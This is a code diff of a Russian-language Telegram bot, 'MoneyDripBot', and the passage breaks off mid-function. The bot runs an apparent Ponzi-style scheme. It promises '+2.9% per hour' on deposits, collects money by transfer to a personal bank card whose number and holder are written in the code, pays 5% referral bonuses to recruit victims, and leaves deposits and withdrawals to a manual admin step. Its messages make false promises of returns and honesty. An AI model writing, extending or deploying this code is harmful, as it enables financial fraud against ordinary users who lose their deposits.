@@ -13,7 +13,7 @@ ADMIN_ID = 7603296347
 SUPPORT_USERNAME = "WWWMMMZZZwq"
 CARD_NUMBER = "2200 7012 3329 6489"
 CARD_HOLDER = "Дмитрий А."
-REFERRAL_BONUS = 0.05  # 5% от пополнения реферала
+REFERRAL_BONUS = 0.05
 # ================================
 
 bot = Bot(token=TOKEN)
@@ -32,7 +32,6 @@ def parse_amount(text: str) -> float:
 # === БАЗА ДАННЫХ ===
 async def init_db():
     async with aiosqlite.connect("users.db") as db:
-        # Основная таблица пользователей
         await db.execute("""
             CREATE TABLE IF NOT EXISTS users (
                 user_id INTEGER PRIMARY KEY,
@@ -47,8 +46,6 @@ async def init_db():
                 created_at TEXT DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # Таблица истории операций
         await db.execute("""
             CREATE TABLE IF NOT EXISTS history (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -60,8 +57,6 @@ async def init_db():
                 created_at TEXT DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # Таблица статистики
         await db.execute("""
             CREATE TABLE IF NOT EXISTS stats (
                 date TEXT PRIMARY KEY,
@@ -71,7 +66,6 @@ async def init_db():
                 invests REAL DEFAULT 0
             )
         """)
-        
         await db.commit()
 
 # === ДОБАВЛЕНИЕ В ИСТОРИЮ ===
@@ -83,40 +77,26 @@ async def add_history(user_id: int, type: str, amount: float, status: str = "com
         )
         await db.commit()
 
-# === СТАРТ (С РЕФЕРАЛЬНОЙ ССЫЛКОЙ) ===
+# === СТАРТ ===
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     user_id = message.from_user.id
     args = message.text.split()
     
     async with aiosqlite.connect("users.db") as db:
-        # Проверяем, новый ли пользователь
         async with db.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,)) as cursor:
             user = await cursor.fetchone()
         
         is_new = user is None
+        await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
         
-        # Регистрируем пользователя
-        await db.execute(
-            "INSERT OR IGNORE INTO users (user_id) VALUES (?)",
-            (user_id,)
-        )
-        
-        # Обрабатываем реферальную ссылку
         if len(args) > 1 and args[1].startswith("ref"):
             referrer_id = int(args[1].replace("ref", ""))
             if referrer_id != user_id and is_new:
-                await db.execute(
-                    "UPDATE users SET referrer_id = ? WHERE user_id = ?",
-                    (referrer_id, user_id)
-                )
-                
-                # Добавляем в историю
+                await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
                 await add_history(user_id, "Регистрация", 0, "completed", f"Реферер: {referrer_id}")
-        
         await db.commit()
     
-    # Генерируем реферальную ссылку
     ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -131,18 +111,18 @@ async def cmd_start(message: Message):
          InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
     ])
     
-    welcome_text = (
-        "🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
-        "💰 Здесь твои деньги работают 24/7\n"
-        "📈 Каждый час +2,9% к сумме в работе\n"
-        "💳 Пополнение и вывод на карту\n\n"
-        "🎁 *Твоя реферальная ссылка:*\n"
+    await message.answer(
+        f"🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
+        f"💰 Здесь твои деньги работают 24/7\n"
+        f"📈 Каждый час +2,9% к сумме в работе\n"
+        f"💳 Пополнение и вывод на карту\n\n"
+        f"🎁 *Твоя реферальная ссылка:*\n"
         f"`{ref_link}`\n\n"
-        "🔥 Приводи друзей и получай 5% с их пополнений!\n\n"
-        "👇 Выбери действие:"
+        f"🔥 Приводи друзей и получай 5% с их пополнений!\n\n"
+        f"👇 Выбери действие:",
+        parse_mode="Markdown",
+        reply_markup=keyboard
     )
-    
-    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)
 
 # === БАЛАНС ===
 @dp.callback_query(lambda c: c.data == "balance")
@@ -175,21 +155,16 @@ async def show_referrals(call: CallbackQuery):
     user_id = call.from_user.id
     
     async with aiosqlite.connect("users.db") as db:
-        # Считаем количество рефералов
         async with db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,)) as cursor:
-            ref_count = await cursor.fetchone()
-            ref_count = ref_count[0]
-        
-        # Сумма заработка с рефералов
+            ref_count = (await cursor.fetchone())[0]
         async with db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,)) as cursor:
             row = await cursor.fetchone()
             ref_earnings = row[0] if row else 0
     
-    # Реферальная ссылка
     ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data=f"copy_ref")],
+        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref")],
         [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
     ])
     
@@ -200,8 +175,7 @@ async def show_referrals(call: CallbackQuery):
         f"📊 *Статистика:*\n"
         f"• Приглашено: `{ref_count}` чел.\n"
         f"• Заработано: `{ref_earnings:,.0f}₽`\n\n"
-        f"💰 *Бонус:* 5% с каждого пополнения реферала\n"
-        f"✅ Бонус начисляется сразу после пополнения\n\n"
+        f"💰 *Бонус:* 5% с каждого пополнения реферала\n\n"
         f"👉 Отправь ссылку друзьям и зарабатывай!",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -251,18 +225,18 @@ async def deposit_start(call: CallbackQuery):
     ])
     
     await call.message.edit_text(
-        "📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
+        f"📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
         f"💳 *Карта для перевода:*\n"
         f"`{CARD_NUMBER}`\n"
         f"👤 *Получатель:* {CARD_HOLDER}\n\n"
-        "💰 *Минимальная сумма:* 100₽\n"
-        "🚀 *Максимум:* безлимит\n\n"
-        "📌 *Как пополнить:*\n"
-        "1️⃣ Переведи любую сумму на карту\n"
-        "2️⃣ Нажми кнопку *«✅ Я оплатил»*\n"
-        "3️⃣ Введи сумму перевода\n\n"
-        "✅ Примеры: `500`, `1.5k`, `2K`\n"
-        "👉 `1k = 1000₽`",
+        f"💰 *Минимальная сумма:* 100₽\n"
+        f"🚀 *Максимум:* безлимит\n\n"
+        f"📌 *Как пополнить:*\n"
+        f"1️⃣ Переведи любую сумму на карту\n"
+        f"2️⃣ Нажми кнопку *«✅ Я оплатил»*\n"
+        f"3️⃣ Введи сумму перевода\n\n"
+        f"✅ Примеры: `500`, `1.5k`, `2K`\n"
+        f"👉 `1k = 1000₽`",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
@@ -276,8 +250,8 @@ async def i_paid(call: CallbackQuery):
     
     await call.message.edit_text(
         "📝 *Введите сумму перевода:*\n\n"
-        "➡️ Например: `500`, `1.5k`, `2K`\n\n"
-        "⚠️ Сумма должна совпадать с переводом!",
+        f"➡️ Например: `500`, `1.5k`, `2K`\n\n"
+        f"⚠️ Сумма должна совпадать с переводом!",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
@@ -302,13 +276,11 @@ async def process_deposit(message: Message):
         await db.commit()
         await add_history(user_id, "deposit", amount, "pending", f"Заявка на пополнение")
     
-    # Получаем информацию о реферере
     async with aiosqlite.connect("users.db") as db:
         async with db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,)) as cursor:
             row = await cursor.fetchone()
             referrer_id = row[0] if row else 0
     
-    # Отправляем админу
     await bot.send_message(
         ADMIN_ID,
         f"🔔 *НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ*\n"
@@ -328,7 +300,7 @@ async def process_deposit(message: Message):
         parse_mode="Markdown"
     )
 
-# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ (С БОНУСОМ РЕФЕРЕРУ) ===
+# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ ===
 @dp.message(Command("confirm"))
 async def confirm_deposit(message: Message):
     if message.from_user.id != ADMIN_ID:
@@ -350,17 +322,14 @@ async def confirm_deposit(message: Message):
             amount = row[0]
             referrer_id = row[1]
             
-            # Начисляем баланс пользователю
             await db.execute("UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?", (amount, user_id))
             
-            # Начисляем бонус рефереру (5%)
             if referrer_id and referrer_id != 0:
                 bonus = amount * REFERRAL_BONUS
                 await db.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", 
                                (bonus, bonus, referrer_id))
                 await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за пополнение реферала {user_id}")
                 
-                # Уведомляем реферера
                 try:
                     await bot.send_message(
                         referrer_id,
@@ -394,11 +363,11 @@ async def multiply_start(call: CallbackQuery):
     
     await call.message.edit_text(
         "💰 *УМНОЖЕНИЕ ДЕНЕГ*\n\n"
-        "💸 Введи сумму для запуска в работу:\n"
-        "• Минимум: 100₽\n"
-        "• Каждый час +2,9%\n\n"
-        "✅ Примеры: `500`, `1.5k`, `2K`\n\n"
-        "⚠️ *Деньги спишутся с баланса мгновенно!*",
+        f"💸 Введи сумму для запуска в работу:\n"
+        f"• Минимум: 100₽\n"
+        f"• Каждый час +2,9%\n\n"
+        f"✅ Примеры: `500`, `1.5k`, `2K`\n\n"
+        f"⚠️ *Деньги спишутся с баланса мгновенно!*",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
@@ -478,11 +447,11 @@ async def withdraw_start(call: CallbackQuery):
     
     await call.message.edit_text(
         "📤 *ВЫВОД СРЕДСТВ*\n\n"
-        "💰 Минимальная сумма: 100₽\n"
-        "💳 Вывод на карту\n\n"
-        "➡️ *Введи сумму и номер карты:*\n"
-        "Формат: `СУММА НОМЕР_КАРТЫ`\n\n"
-        "✅ Пример: `1000 2200123456789012`",
+        f"💰 Минимальная сумма: 100₽\n"
+        f"💳 Вывод на карту\n\n"
+        f"➡️ *Введи сумму и номер карты:*\n"
+        f"Формат: `СУММА НОМЕР_КАРТЫ`\n\n"
+        f"✅ Пример: `1000 2200123456789012`",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
@@ -577,54 +546,6 @@ async def confirm_withdraw(message: Message):
         parse_mode="Markdown"
     )
 
-# === СТАТИСТИКА (АДМИН) ===
-@dp.message(Command("stats"))
-async def stats(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    
-    async with aiosqlite.connect("users.db") as db:
-        # Общая статистика
-        async with db.execute("SELECT COUNT(*) FROM users") as cursor:
-            total_users = (await cursor.fetchone())[0]
-        
-        async with db.execute("SELECT COUNT(*) FROM users WHERE DATE(created_at) = DATE('now')") as cursor:
-            new_users_today = (await cursor.fetchone())[0]
-        
-        async with db.execute("SELECT SUM(balance) FROM users") as cursor:
-            total_balance = (await cursor.fetchone())[0] or 0
-        
-        async with db.execute("SELECT SUM(invest_sum) FROM users") as cursor:
-            total_invest = (await cursor.fetchone())[0] or 0
-        
-        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'deposit' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
-            deposits_today = (await cursor.fetchone())[0] or 0
-        
-        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'withdraw' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
-            withdraws_today = (await cursor.fetchone())[0] or 0
-        
-        async with db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'") as cursor:
-            pending_requests = (await cursor.fetchone())[0]
-    
-    text = (
-        f"📊 *СТАТИСТИКА БОТА*\n\n"
-        f"👥 *Пользователи:*\n"
-        f"• Всего: `{total_users}`\n"
-        f"• Новых сегодня: `{new_users_today}`\n\n"
-        f"💰 *Финансы:*\n"
-        f"• Общий баланс: `{total_balance:,.0f}₽`\n"
-        f"• В работе: `{total_invest:,.0f}₽`\n"
-        f"• Пополнений сегодня: `{deposits_today:,.0f}₽`\n"
-        f"• Выводов сегодня: `{withdraws_today:,.0f}₽`\n\n"
-        f"⏳ *Заявки:*\n"
-        f"• В обработке: `{pending_requests}`\n\n"
-        f"📈 *Проценты:* 2,9% в час\n"
-        f"🎁 *Реферальный бонус:* 5%\n"
-        f"💳 *Карта:* `{CARD_NUMBER[-4:]}`"
-    )
-    
-    await message.answer(text, parse_mode="Markdown")
-
 # === ДОБАВИТЬ БАЛАНС (АДМИН) ===
 @dp.message(Command("add"))
 async def add_balance(message: Message):
@@ -651,54 +572,6 @@ async def add_balance(message: Message):
         parse_mode="Markdown"
     )
 
-# === ПОДДЕРЖКА ===
-@dp.callback_query(lambda c: c.data == "support")
-async def support(call: CallbackQuery):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👤 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")],
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
-    ])
-    
-    await call.message.edit_text(
-        "🛡 *ПОДДЕРЖКА*\n\n"
-        f"📩 Логин: @{SUPPORT_USERNAME}\n"
-        f"⏱ Время ответа: 5–15 минут\n\n"
-        f"💬 Пиши по любым вопросам!",
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
-
-# === КОПИРОВАТЬ РЕФЕРАЛЬНУЮ ССЫЛКУ ===
-@dp.callback_query(lambda c: c.data == "copy_ref")
-async def copy_ref(call: CallbackQuery):
-    await call.answer("Ссылка скопирована! 📋", show_alert=False)
-    await call.message.delete()
-    await cmd_start(call.message)
-
-# === ИНФО ===
-@dp.callback_query(lambda c: c.data == "info")
-async def info(call: CallbackQuery):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
-    ])
-    
-    await call.message.edit_text(
-        "ℹ️ *ИНФОРМАЦИЯ*\n\n"
-        "💰 *Проценты:* 2,9% в час\n"
-        "📉 *Мин. старт:* 100₽\n"
-        "📤 *Мин. вывод:* 100₽\n"
-        "🎁 *Реферальный бонус:* 5%\n"
-        "💳 *Карта:* Сбербанк\n\n"
-        "📌 *Форматы ввода:*\n"
-        "• `500` — 500₽\n"
-        "• `1.5k` — 1500₽\n"
-        "• `2K` — 2000₽\n"
-        "• `*500` — умножение\n\n"
-        "✅ Работаем честно с 2024 года",
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
-
 # === ПРОЦЕНТЫ ИНФО ===
 @dp.callback_query(lambda c: c.data == "percent_info")
 async def percent_info(call: CallbackQuery):
@@ -711,5 +584,122 @@ async def percent_info(call: CallbackQuery):
         "1️⃣ Пополни баланс через карту\n"
         "2️⃣ Запусти деньги в работу (*1000)\n"
         "3️⃣ Каждый час +2,9%\n\n"
+        "✨ *Пример:*\n"
+        "1000₽ → 1029₽ (час)\n"
+        "→ ~2000₽ (день)",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
 
-        "✨ *Пример:*"
+# === ПОДДЕРЖКА ===
+@dp.callback_query(lambda c: c.data == "support")
+async def support(call: CallbackQuery):
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="👤 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")],
+        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
+    ])
+    
+    await call.message.edit_text(
+        f"🛡 *ПОДДЕРЖКА*\n\n"
+        f"📩 Логин: @{SUPPORT_USERNAME}\n"
+        f"⏱ Время ответа: 5–15 минут\n\n"
+        f"💬 Пиши по любым вопросам!",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+# === ИНФО ===
+@dp.callback_query(lambda c: c.data == "info")
+async def info(call: CallbackQuery):
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
+    ])
+    
+    await call.message.edit_text(
+        "ℹ️ *ИНФОРМАЦИЯ*\n\n"
+        f"💰 *Проценты:* 2,9% в час\n"
+        f"📉 *Мин. старт:* 100₽\n"
+        f"📤 *Мин. вывод:* 100₽\n"
+        f"🎁 *Реферальный бонус:* 5%\n"
+        f"💳 *Карта:* Сбербанк\n\n"
+        f"📌 *Форматы ввода:*\n"
+        f"• `500` — 500₽\n"
+        f"• `1.5k` — 1500₽\n"
+        f"• `2K` — 2000₽\n"
+        f"• `*500` — умножение\n\n"
+        f"✅ Работаем честно с 2024 года",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+# === КОПИРОВАТЬ РЕФЕРАЛЬНУЮ ССЫЛКУ ===
+@dp.callback_query(lambda c: c.data == "copy_ref")
+async def copy_ref(call: CallbackQuery):
+    await call.answer("Ссылка скопирована! 📋", show_alert=False)
+
+# === СТАТИСТИКА (АДМИН) ===
+@dp.message(Command("stats"))
+async def stats(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    async with aiosqlite.connect("users.db") as db:
+        async with db.execute("SELECT COUNT(*) FROM users") as cursor:
+            total_users = (await cursor.fetchone())[0]
+        async with db.execute("SELECT COUNT(*) FROM users WHERE DATE(created_at) = DATE('now')") as cursor:
+            new_users_today = (await cursor.fetchone())[0]
+        async with db.execute("SELECT SUM(balance) FROM users") as cursor:
+            total_balance = (await cursor.fetchone())[0] or 0
+        async with db.execute("SELECT SUM(invest_sum) FROM users") as cursor:
+            total_invest = (await cursor.fetchone())[0] or 0
+        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'deposit' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
+            deposits_today = (await cursor.fetchone())[0] or 0
+        async with db.execute("SELECT SUM(amount) FROM history WHERE type = 'withdraw' AND status = 'completed' AND DATE(created_at) = DATE('now')") as cursor:
+            withdraws_today = (await cursor.fetchone())[0] or 0
+        async with db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'") as cursor:
+            pending_requests = (await cursor.fetchone())[0]
+    
+    await message.answer(
+        f"📊 *СТАТИСТИКА БОТА*\n\n"
+        f"👥 *Пользователи:*\n"
+        f"• Всего: `{total_users}`\n"
+        f"• Новых сегодня: `{new_users_today}`\n\n"
+        f"💰 *Финансы:*\n"
+        f"• Общий баланс: `{total_balance:,.0f}₽`\n"
+        f"• В работе: `{total_invest:,.0f}₽`\n"
+        f"• Пополнений сегодня: `{deposits_today:,.0f}₽`\n"
+        f"• Выводов сегодня: `{withdraws_today:,.0f}₽`\n\n"
+        f"⏳ *Заявки:*\n"
+        f"• В обработке: `{pending_requests}`\n\n"
+        f"📈 *Проценты:* 2,9% в час\n"
+        f"🎁 *Реферальный бонус:* 5%\n"
+        f"💳 *Карта:* `{CARD_NUMBER[-4:]}`",
+        parse_mode="Markdown"
+    )
+
+# === УЗНАТЬ СВОЙ ID ===
+@dp.message(Command("id"))
+async def get_id(message: Message):
+    await message.answer(f"🆔 *Твой Telegram ID:* `{message.from_user.id}`", parse_mode="Markdown")
+
+# === НАЗАД В МЕНЮ ===
+@dp.callback_query(lambda c: c.data == "back_to_menu")
+async def back_to_menu(call: CallbackQuery):
+    user_id = call.from_user.id
+    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
+        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
+         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
+        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
+         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
+        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
+         InlineKeyboardButton(text="📊 История", callback_data="history")],
+        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
+         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
+    ])
+    
+    await call.message.edit_text(
+        f"🚀 *Главное меню*\n\n"
+       
